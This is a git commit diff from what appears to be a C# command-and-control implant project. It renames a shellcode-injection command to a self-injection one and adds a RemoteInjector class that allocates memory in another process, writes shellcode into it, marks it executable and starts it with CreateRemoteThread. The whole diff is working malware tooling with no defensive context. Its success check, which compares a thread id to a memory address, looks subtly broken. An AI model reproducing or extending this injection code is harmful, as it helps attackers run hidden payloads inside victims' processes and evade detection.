d150cbb45e50cd2465a901904a66da5205b1c82e
ErfanMojibi <mojibierfan@gmail.com>
2024-01-13 09:50:17 +0330

    add remote injection

--- Agent/Commands/SelfcodeInject.cs
+++ Agent/Commands/SelfcodeInject.cs
@@ -8,17 +8,14 @@ using Agent.Models;
 
 namespace Agent.Commands
 {
-    public class ShellcodeInject : AgentCommand
+    public class SelfcodeInject : AgentCommand
     {
-        public override string Name => "shinject";
+        public override string Name => "selfinject";
         public override string Execute(AgentTask task)
         {
-
-            if (!int.TryParse(task.Arguments[0], out var pid))
-                return "Failed to parse pid";
-            var injector = new RemoteInjector();
+            var injector = new SelfInjector();
             var shellcode = task.FileBytes;
-            var res = injector.Inject(shellcode, pid);
+            var res = injector.Inject(task.FileBytes);
             if (res)
                 return "Injected successfully";
             return "Failed to inject";
---
+++ Agent/Internal/RemoteInjector.cs
@@ -0,0 +1,28 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using Agent.Native;
+
+namespace Agent.Internal
+{
+    public class RemoteInjector : Injector
+    {
+        public override bool Inject(byte[] shellcode, int pid = 0)
+        {
+            var proc = Process.GetProcessById(pid);
+            var baseAddr = Native.Kernel32.VirtualAllocEx(proc.Handle, IntPtr.Zero, shellcode.Length,
+                Kernel32.AllocationType.Commit | Kernel32.AllocationType.Reserve, Kernel32.MemoryProtection.ReadWrite);
+            Native.Kernel32.WriteProcessMemory(proc.Handle, baseAddr, shellcode, shellcode.Length, out var _);
+            Native.Kernel32.VirtualProtectEx(proc.Handle, baseAddr, shellcode.Length,
+                Kernel32.MemoryProtection.ExecuteRead, out var old);
+            Native.Kernel32.CreateRemoteThread(proc.Handle, IntPtr.Zero, 0, baseAddr, IntPtr.Zero, 0, out var tid);
+            if (tid != baseAddr)
+                return true;
+            return false;
+
+        }
+    }
+}
